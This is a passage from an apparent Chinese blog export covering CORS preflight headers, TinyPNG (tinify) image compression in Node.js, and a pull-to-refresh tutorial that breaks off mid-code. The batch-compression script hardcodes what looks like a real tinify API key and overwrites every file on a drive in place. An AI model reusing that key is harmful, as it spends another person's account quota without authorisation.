Mozilla&#x2F;5.0…</p></blockquote><p>“预检”请求用的请求方法是<strong>OPTIONS</strong>，表示这个请求是用来询问的。头信息里面，关键字段是<strong>Origin</strong>，表示请求来自哪个源。</p><p>除了Origin字段，”预检”请求的头信息包括两个特殊字段。</p><ul><li>（1）Access-Control-Request-Method</li></ul><p>该字段是必须的，用来列出浏览器的<strong>CORS</strong>请求会用到哪些HTTP方法，上例是PUT。</p><ul><li>（2）Access-Control-Request-Headers</li></ul><p>该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。</p><h6 id="4-2-预检请求的回应"><a href="#4-2-预检请求的回应" class="headerlink" title="4.2 预检请求的回应"></a>4.2 预检请求的回应</h6><p>服务器收到”预检”请求以后，检查了<strong>Origin、Access-Control-Request-Method和Access-Control-Request-Headers</strong>字段以后，确认允许跨源请求，就可以做出回应。</p><blockquote><p>HTTP&#x2F;1.1 200 OK<br>Date: Mon, 01 Dec 2008 01:15:39 GMT<br>Server: Apache&#x2F;2.0.61 (Unix)<br>Access-Control-Allow-Origin: <a href="http://api.bob.com/">http://api.bob.com</a><br>Access-Control-Allow-Methods: GET, POST, PUT<br>Access-Control-Allow-Headers: X-Custom-Header<br>Content-Type: text&#x2F;html; charset&#x3D;utf-8<br>Content-Encoding: gzip<br>Content-Length: 0<br>Keep-Alive: timeout&#x3D;2, max&#x3D;100<br>Connection: Keep-Alive<br>Content-Type: text&#x2F;plain</p></blockquote><p>上面的HTTP回应中，关键的是<strong>Access-Control-Allow-Origin</strong>字段，表示<a href="http://api.bob.com可以请求数据.该字段也可以设为星号,表示同意任意跨源请求./">http://api.bob.com可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。</a></p><blockquote><p>Access-Control-Allow-Origin: *</p></blockquote><p>如果浏览器否定了”预检”请求，会返回一个正常的<strong>HTTP</strong>回应，但是没有任何<strong>CORS</strong>相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被<strong>XMLHttpRequest</strong>对象的<strong>onerror</strong>回调函数捕获。控制台会打印出如下的报错信息。</p><blockquote><p>XMLHttpRequest cannot load <a href="http://api.alice.com/">http://api.alice.com</a>.<br>Origin <a href="http://api.bob.com/">http://api.bob.com</a> is not allowed by Access-Control-Allow-Origin.</p></blockquote><p>服务器回应的其他<strong>CORS</strong>相关字段如下。</p><blockquote><p>Access-Control-Allow-Methods: GET, POST, PUT<br>Access-Control-Allow-Headers: X-Custom-Header<br>Access-Control-Allow-Credentials: true<br>Access-Control-Max-Age: 1728000</p></blockquote><ul><li>（1）Access-Control-Allow-Methods</li></ul><p>该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次”预检”请求。</p><ul><li>（2）Access-Control-Allow-Headers</li></ul><p>如果浏览器请求包括<strong>Access-Control-Request-Headers</strong>字段，则<strong>Access-Control-Allow-Headers</strong>字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在”预检”中请求的字段。</p><ul><li>（3）Access-Control-Allow-Credentials</li></ul><p>该字段与简单请求时的含义相同。</p><ul><li>（4）Access-Control-Max-Age</li></ul><p>该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。</p><h6 id="4-3-浏览器的正常请求和回应"><a href="#4-3-浏览器的正常请求和回应" class="headerlink" title="4.3 浏览器的正常请求和回应"></a>4.3 浏览器的正常请求和回应</h6><p>一旦服务器通过了”预检”请求，以后每次浏览器正常的<strong>CORS</strong>请求，就都跟简单请求一样，会有一个<strong>Origin</strong>头信息字段。服务器的回应，也都会有一个<strong>Access-Control-Allow-Origin</strong>头信息字段。</p><p>下面是”预检”请求之后，浏览器的正常<strong>CORS</strong>请求。</p><blockquote><p>PUT &#x2F;cors HTTP&#x2F;1.1<br>Origin: <a href="http://api.bob.com/">http://api.bob.com</a><br>Host: api.alice.com<br>X-Custom-Header: value<br>Accept-Language: en-US<br>Connection: keep-alive<br>User-Agent: Mozilla&#x2F;5.0…</p></blockquote><p>上面头信息的<strong>Origin</strong>字段是浏览器自动添加的。</p><p>下面是服务器正常的回应。</p><blockquote><p>Access-Control-Allow-Origin: <a href="http://api.bob.com/">http://api.bob.com</a><br>Content-Type: text&#x2F;html; charset&#x3D;utf-8</p></blockquote><p>上面头信息中，<strong>Access-Control-Allow-Origin</strong>字段是每次回应都必定包含的。</p><h5 id="五、与JSONP的比较"><a href="#五、与JSONP的比较" class="headerlink" title="五、与JSONP的比较"></a>五、与JSONP的比较</h5><p>CORS与JSONP的使用目的相同，但是比JSONP更强大。</p><p>JSONP只支持<strong>GET</strong>请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。</p><p>（完）</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>自制node小工具，批量无损压缩图片</title>
      <link href="/Blog/2018/09/21/node_js/%E8%87%AA%E5%88%B6node%E5%B0%8F%E5%B7%A5%E5%85%B7%EF%BC%8C%E6%89%B9%E9%87%8F%E6%97%A0%E6%8D%9F%E5%8E%8B%E7%BC%A9%E5%9B%BE%E7%89%87/index/"/>
      <url>/Blog/2018/09/21/node_js/%E8%87%AA%E5%88%B6node%E5%B0%8F%E5%B7%A5%E5%85%B7%EF%BC%8C%E6%89%B9%E9%87%8F%E6%97%A0%E6%8D%9F%E5%8E%8B%E7%BC%A9%E5%9B%BE%E7%89%87/index/</url>
      
        <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//解析需要遍历的文件夹，我这以E盘根目录为例</span></span><br><span class="line"><span class="keyword">var</span> filePath = path.<span class="title function_">resolve</span>(<span class="string">&#x27;E:&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> tinify = <span class="built_in">require</span>(<span class="string">&#x27;tinify&#x27;</span>)</span><br><span class="line">tinify.<span class="property">key</span> = <span class="string">&quot;WpYVeU3DkB5v6oQJRPAijtBhFdP5wn5D&quot;</span>; <span class="comment">// key 上限为500，请自行到官网注册 https://tinypng.com/dashboard/api</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//调用文件遍历方法</span></span><br><span class="line"><span class="title function_">fileDisplay</span>(filePath);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 文件遍历方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filePath 需要遍历的文件路径</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fileDisplay</span>(<span class="params">filePath</span>)&#123;</span><br><span class="line">    <span class="comment">//根据文件路径读取文件，返回文件列表</span></span><br><span class="line">    fs.<span class="title function_">readdir</span>(filePath,<span class="keyword">function</span>(<span class="params">err,files</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">warn</span>(err)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//遍历读取到的文件列表</span></span><br><span class="line">            files.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">filename</span>)&#123;</span><br><span class="line">                <span class="comment">//获取当前文件的绝对路径</span></span><br><span class="line">                <span class="keyword">var</span> filedir = path.<span class="title function_">join</span>(filePath,filename);</span><br><span class="line">                <span class="comment">//根据文件路径获取文件信息，返回一个fs.Stats对象</span></span><br><span class="line">                fs.<span class="title function_">stat</span>(filedir,<span class="keyword">function</span>(<span class="params">eror,stats</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(eror)&#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&#x27;获取文件stats失败&#x27;</span>);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">var</span> isFile = stats.<span class="title function_">isFile</span>();<span class="comment">//是文件</span></span><br><span class="line">                        <span class="keyword">var</span> isDir = stats.<span class="title function_">isDirectory</span>();<span class="comment">//是文件夹</span></span><br><span class="line">                        <span class="keyword">if</span>(isFile)&#123;</span><br><span class="line">                            <span class="variable language_">console</span>.<span class="title function_">log</span>(filedir);</span><br><span class="line">                            <span class="comment">// 压缩图片</span></span><br><span class="line">                            <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;tinify.<span class="title function_">fromFile</span>(filedir).<span class="title function_">toFile</span>(filedir)&#125;);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(isDir)&#123;</span><br><span class="line">                            <span class="title function_">fileDisplay</span>(filedir);<span class="comment">//递归，如果是文件夹，就继续遍历该文件夹下面的文件</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>node.js最简捷的压缩图片方式</title>
      <link href="/Blog/2018/09/21/node_js/node%C2%B7js%E6%9C%80%E7%AE%80%E6%8D%B7%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%9B%BE%E7%89%87%E6%96%B9%E5%BC%8F/index/"/>
      <url>/Blog/2018/09/21/node_js/node%C2%B7js%E6%9C%80%E7%AE%80%E6%8D%B7%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%9B%BE%E7%89%87%E6%96%B9%E5%BC%8F/index/</url>
      
        <content type="html"><![CDATA[<p>近期在做项目时，发现前端通过base64上传的图片，通过node的fs模块处理之后图片变得异常的大。因此寻找node压缩图片的途径，也百度过很多方案，但是方法总是很<strong>繁琐</strong>，一个偶然的机会看到了<a href="http://www.baidu.com/link?url=sPV4y0zV3zF9Ce-AFJfFfA7IQvWS3d9Cy9yvFe5fsRy">TinyPNG</a>提供的压缩图片的API。</p><blockquote><p>因为本人之前在压缩网络图片上用的都是这款应用，<strong>无损压缩真的是非常好用，推荐！</strong><br>感谢史上最好用的图片压缩解决方案 <a href="https://tinypng.com/developers">tinify</a></p></blockquote><p>tinfy的API现已支持如下多种语言环境：</p><ul><li><a href="https://tinypng.com/developers/reference">HTTP</a></li><li><a href="https://tinypng.com/developers/reference/ruby">RUBY</a></li><li><a href="https://tinypng.com/developers/reference/php">PHP</a></li><li><a href="https://tinypng.com/developers/reference/nodejs">NODE.JS</a></li><li><a href="https://tinypng.com/developers/reference/python">PYTHON</a></li><li><a href="https://tinypng.com/developers/reference/java">JAVA</a></li><li><a href="https://tinypng.com/developers/reference/dotnet">.NET</a></li></ul><h6 id="并且在node-js使用非常简单！"><a href="#并且在node-js使用非常简单！" class="headerlink" title="并且在node.js使用非常简单！"></a>并且在node.js使用非常简单！</h6><p>所有请求都将通过加密的<a href="http://en.wikipedia.org/wiki/HTTP_Secure">HTTPS</a>连接进行<br>直接上代码（要使用API​​，您必须提供API密钥。您可以通过注册您的姓名和电子邮件地址来 <a href="https://tinypng.com/developers">获取API密钥</a>。始终保密API密钥！）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">npm install --save tinify</span><br><span class="line">var tinify = require(<span class="string">&quot;tinify&quot;</span>);</span><br><span class="line">tinify.key = <span class="string">&quot;YOUR_API_KEY&quot;</span>; <span class="regexp">//</span> 自行注册</span><br><span class="line"><span class="regexp">//</span>您可以将任何JPEG或PNG图像上传到Tinify API进行压缩。</span><br><span class="line"><span class="regexp">//</span>我们将自动检测图像类型并相应地使用TinyPNG或TinyJPG引擎进行优化。只要您上传文件或提供图片的URL，就会开始压缩。</span><br><span class="line"><span class="regexp">//</span>您可以选择本地文件作为源，并将其写入另一个文件。</span><br><span class="line">var source = tinify.fromFile(<span class="string">&quot;unoptimized.jpg&quot;</span>);</span><br><span class="line"> <span class="regexp">//</span> 这里输入文件也支持网址形式：tinify.fromUrl(<span class="string">&quot;https://tinypng.com/images/panda-happy.png&quot;</span>);</span><br><span class="line">source.toFile(<span class="string">&quot;optimized.jpg&quot;</span>);  </span><br><span class="line"><span class="regexp">//</span> 上述两行代码也支持连写哦！tinify.fromFile(<span class="string">&quot;unoptimized.jpg&quot;</span>).toFile(<span class="string">&quot;optimized.jpg&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="案例传送门"><a href="#案例传送门" class="headerlink" title="案例传送门"></a><a href="https://www.jianshu.com/p/546b648406b1">案例传送门</a></h5><h5 id="只需4行代码即可搞定图片的无损压缩，用户体验完美：）"><a href="#只需4行代码即可搞定图片的无损压缩，用户体验完美：）" class="headerlink" title="只需4行代码即可搞定图片的无损压缩，用户体验完美：）"></a>只需4行代码即可搞定图片的无损压缩，用户体验完美：）</h5><h5 id="到这里本文已经结束啦-爱折腾的小胖友可以接下来看看以下额外的自定义方法"><a href="#到这里本文已经结束啦-爱折腾的小胖友可以接下来看看以下额外的自定义方法" class="headerlink" title="到这里本文已经结束啦~爱折腾的小胖友可以接下来看看以下额外的自定义方法"></a>到这里本文已经结束啦~爱折腾的小胖友可以接下来看看以下额外的自定义方法</h5><ul><li></li><li></li><li></li></ul><h6 id="另外您可以指示API客户端通过HTTP代理发出所有请求。设置代理服务器的URL，可以选择包含凭据。"><a href="#另外您可以指示API客户端通过HTTP代理发出所有请求。设置代理服务器的URL，可以选择包含凭据。" class="headerlink" title="另外您可以指示API客户端通过HTTP代理发出所有请求。设置代理服务器的URL，可以选择包含凭据。"></a>另外您可以指示API客户端通过HTTP代理发出所有请求。设置代理服务器的URL，可以选择包含凭据。</h6><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">tinify.proxy</span> = <span class="string">&quot;http://user:pass@192.168.0.1:8080&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure><h6 id="您还可以从缓冲区（带二进制的字符串）上传图像并获取压缩的图像数据。"><a href="#您还可以从缓冲区（带二进制的字符串）上传图像并获取压缩的图像数据。" class="headerlink" title="您还可以从缓冲区（带二进制的字符串）上传图像并获取压缩的图像数据。"></a>您还可以从缓冲区（带二进制的字符串）上传图像并获取压缩的图像数据。</h6><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var fs = require(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line">fs.read<span class="constructor">File(<span class="string">&quot;unoptimized.jpg&quot;</span>, <span class="params">function</span>(<span class="params">err</span>, <span class="params">sourceData</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) throw err;</span><br><span class="line">  tinify.from<span class="constructor">Buffer(<span class="params">sourceData</span>)</span>.<span class="keyword">to</span><span class="constructor">Buffer(<span class="params">function</span>(<span class="params">err</span>, <span class="params">resultData</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) throw err;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h6 id="调整图像大小"><a href="#调整图像大小" class="headerlink" title="调整图像大小"></a>调整图像大小</h6><p>使用API​​创建已上传图像的已调整大小的版本。通过让API处理调整大小，您可以避免自己编写此类代码，并且只需上传一次图像。调整大小的图像将被优化压缩，具有漂亮和清晰的外观。</p><p>您还可以利用智能裁剪来创建缩略图，这些缩略图专注于图像中最重要的视觉区域。</p><p>调整大小计为一次额外压缩。例如，如果您上传单个图像并检索优化版本加上2个已调整大小的版本，则总计为3次压缩。</p><p>要调整图像大小，请在<code>resize</code>图像源上调用该方法：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">var</span> source = tinify.fromFile(<span class="string">&quot;large.jpg&quot;</span>);</span><br><span class="line"><span class="built_in">var</span> resized = source.resize(&#123;</span><br><span class="line">  <span class="built_in">method</span>: <span class="string">&quot;fit&quot;</span>,</span><br><span class="line">  <span class="built_in">width</span>: <span class="number">150</span>,</span><br><span class="line">  <span class="built_in">height</span>: <span class="number">100</span></span><br><span class="line">&#125;);</span><br><span class="line">resized.toFile(<span class="string">&quot;thumbnail.jpg&quot;</span>);</span><br></pre></td></tr></table></figure><p>在<code>method</code>描述你的图像将被调整的方式。可以使用以下方法：</p><p><img src="/Blog/2018/09/21/node_js/node%C2%B7js%E6%9C%80%E7%AE%80%E6%8D%B7%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%9B%BE%E7%89%87%E6%96%B9%E5%BC%8F/index/img.png"></p><p>如果目标尺寸大于原始尺寸，则图像不会按比例放大。为了保护图像质量，可以防止向上扩展。</p><h6 id="保留元数据"><a href="#保留元数据" class="headerlink" title="保留元数据"></a>保留元数据</h6><p>您可以请求将特定元数据从上载的映像复制到压缩版本。目前支持保存copyright信息，GPS location和creation日期。保留元数据会增加压缩文件的大小，因此您应该只保留重要的元数据。</p><p>保留元数据不会算作额外的压缩。但是，在后台，将使用其他元数据再次创建图像。</p><p>要保留特定元数据，请在<code>preserve</code>图像源上调用该方法：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var source = tinify.from<span class="constructor">File(<span class="string">&quot;large.jpg&quot;</span>)</span>;</span><br><span class="line">var copyrighted = source.preserve(<span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;creation&quot;</span>);</span><br><span class="line">copyrighted.<span class="keyword">to</span><span class="constructor">File(<span class="string">&quot;optimized-copyright.jpg&quot;</span>)</span>;</span><br></pre></td></tr></table></figure><p>您可以提供以下选项以保留特定元数据。如果上载的图像中不存在请求的元数据，则不会添加元数据。</p><p><code>copyright</code><br>保留所有版权信息。这包括EXIF版权标记（JPEG），XMP权限标记（PNG）以及Photoshop版权标记或URL。最多使用90个字节，加上版权数据的长度。<br><code>creation</code><br>保留任何创建日期或时间。这是最初创建图像或照片的时刻。这包括EXIF原始日期时间标记（JPEG）或XMP创建时间（PNG）。使用大约70个额外字节。<br><code>location</code> <strong>（仅限JPEG）</strong><br>保留任何描述图像或照片拍摄位置的GPS位置数据。这包括EXIF GPS纬度和GPS经度标签（JPEG）。使用大约130个额外字节。</p>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>实现一个上拉加载，下拉刷新</title>
      <link href="/Blog/2018/09/07/essay/%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E4%B8%8A%E6%8B%89%E5%8A%A0%E8%BD%BD%EF%BC%8C%E4%B8%8B%E6%8B%89%E5%88%B7%E6%96%B0/index/"/>
      <url>/Blog/2018/09/07/essay/%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E4%B8%8A%E6%8B%89%E5%8A%A0%E8%BD%BD%EF%BC%8C%E4%B8%8B%E6%8B%89%E5%88%B7%E6%96%B0/index/</url>
      
        <content type="html"><![CDATA[<h5 id="我们依旧从界面及逻辑两块进行分析"><a href="#我们依旧从界面及逻辑两块进行分析" class="headerlink" title="我们依旧从界面及逻辑两块进行分析"></a>我们依旧从界面及逻辑两块进行分析</h5><p>1.界面上，只分成简单的两块，一块是上方的刷新文字，一块是下方的内容，然后将上方提示内容隐藏在屏幕之外，一般由两种方式，一种是上面遮一层，另一种是marginTop:负值将其弄出屏幕外，这里我采用的是第一种，代码也很简单，就随便贴一下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.header</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">1rem</span>;这里的高度应该与刷新文字一样高</span><br><span class="line">    <span class="attribute">position</span>: fixed;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.功能实现的重头戏是在逻辑上，主要分成下面几个部分</p><ul><li>监听事件</li><li>位置计算</li><li>控制界面变化</li><li>数据更新包</li><li>我一个一个进行分析，然后带你们入坑。</li></ul><p><img src="/Blog/2018/09/07/essay/%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E4%B8%8A%E6%8B%89%E5%8A%A0%E8%BD%BD%EF%BC%8C%E4%B8%8B%E6%8B%89%E5%88%B7%E6%96%B0/index/img.png"></p><h5 id="监听事件，这块简单，直接贴代码"><a href="#监听事件，这块简单，直接贴代码" class="headerlink" title="监听事件，这块简单，直接贴代码"></a>监听事件，这块简单，直接贴代码</h5><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//el为下拉的整个节点</span></span><br><span class="line"><span class="comment">//这里为添加监听</span></span><br><span class="line"><span class="keyword">this</span>.el.addEventListener(<span class="string">&#x27;touchstart&#x27;</span>, <span class="keyword">this</span>.refreshTouchStart);</span><br><span class="line"><span class="keyword">this</span>.el.addEventListener(<span class="string">&#x27;touchmove&#x27;</span>, <span class="keyword">this</span>.refreshTouchMove);</span><br><span class="line"><span class="keyword">this</span>.el.addEventListener(<span class="string">&#x27;touchend&#x27;</span>, <span class="keyword">this</span>.refreshTouchEnd);</span><br><span class="line"><span class="comment">//记住在不用的时候要移除监听哦</span></span><br><span class="line"><span class="keyword">this</span>.el.removeEventListener(<span class="string">&#x27;touchstart&#x27;</span>, <span class="keyword">this</span>.refreshTouchStart);</span><br><span class="line"><span class="keyword">this</span>.el.removeEventListener(<span class="string">&#x27;touchmove&#x27;</span>, <span class="keyword">this</span>.refreshTouchMovee);</span><br><span class="line"><span class="keyword">this</span>.el.removeEventListener(<span class="string">&#x27;touchend&#x27;</span>, <span class="keyword">this</span>.refreshTouchEnd);</span><br><span class="line"><span class="comment">//具体的函数，我们直接在位置计算中看</span></span><br></pre></td></tr></table></figure><p>位置计算 我们分下拉刷新，上拉加载两块计算，分析可得</p><h6 id="下拉刷新的逻辑-x3D-当前页面的首项在屏幕中且容器向下滑动的距离大于一定值"><a href="#下拉刷新的逻辑-x3D-当前页面的首项在屏幕中且容器向下滑动的距离大于一定值" class="headerlink" title="下拉刷新的逻辑 &#x3D; 当前页面的首项在屏幕中且容器向下滑动的距离大于一定值"></a>下拉刷新的逻辑 &#x3D; 当前页面的首项在屏幕中且容器向下滑动的距离大于一定值</h6><h6 id="上拉加载的逻辑-x3D-当前页面已滑动到底部"><a href="#上拉加载的逻辑-x3D-当前页面已滑动到底部" class="headerlink" title="上拉加载的逻辑 &#x3D; 当前页面已滑动到底部"></a>上拉加载的逻辑 &#x3D; 当前页面已滑动到底部</h6><p>好，我们直接看具体的实现逻辑代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代码中包含界面变化和数据更新，仔细看哦</span></span><br><span class="line"><span class="title function_">refreshTouchStart</span>(<span class="params">e</span>) &#123;    </span><br><span class="line">  <span class="keyword">let</span> touch = e.<span class="property">changedTouches</span>[<span class="number">0</span>];    </span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">tipText</span> = <span class="string">&#x27;下拉刷新&#x27;</span>;</span><br><span class="line">  <span class="comment">//下拉提示文字    </span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">startY</span> = touch.<span class="property">clientY</span>;</span><br><span class="line">  <span class="comment">//获得当前按下点的纵坐标</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">refreshTouchMove</span>(<span class="params">e</span>) &#123;    </span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">&#x27;bottomShowFalse&#x27;</span>);</span><br><span class="line">  <span class="comment">//与本逻辑无关，滑动时隐藏底部作用    </span></span><br><span class="line">  <span class="keyword">let</span> touch = e.<span class="property">changedTouches</span>[<span class="number">0</span>];    </span><br><span class="line">  <span class="keyword">let</span> _move = touch.<span class="property">clientY</span> - <span class="variable language_">this</span>.<span class="property">startY</span>;</span><br><span class="line">  <span class="comment">//获得滑动的距离    </span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">bottomFlag</span> = $(<span class="string">&#x27;.present-box&#x27;</span>).<span class="title function_">offset</span>().<span class="property">top</span> + $(<span class="string">&#x27;.present-box&#x27;</span>).<span class="title function_">height</span>() - <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">clientHeight</span> &lt;= <span class="number">40</span>;</span><br><span class="line">  <span class="comment">//滑动到底部标识    </span></span><br><span class="line">  <span class="keyword">if</span> ($(<span class="string">&#x27;.present-box&#x27;</span>).<span class="title function_">offset</span>().<span class="property">top</span> &gt;= <span class="variable language_">this</span>.<span class="property">headerHeight</span>) &#123;</span><br><span class="line">    <span class="comment">//内容主体超出了一个头部的距离        </span></span><br><span class="line">      <span class="keyword">if</span> (_move &gt; <span class="number">0</span> &amp;&amp; _move &lt; <span class="number">1000</span>) &#123;</span><br><span class="line">        <span class="comment">//滑动距离&gt;0代表下拉</span></span><br><span class="line">        <span class="comment">//&lt;1000是为了防止神人无限拉阿拉            </span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">el</span>.<span class="property">style</span>.<span class="property">marginTop</span> = _move + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">        <span class="comment">//根据拉的距离，实现界面上的变化（界面变化）            </span></span><br><span 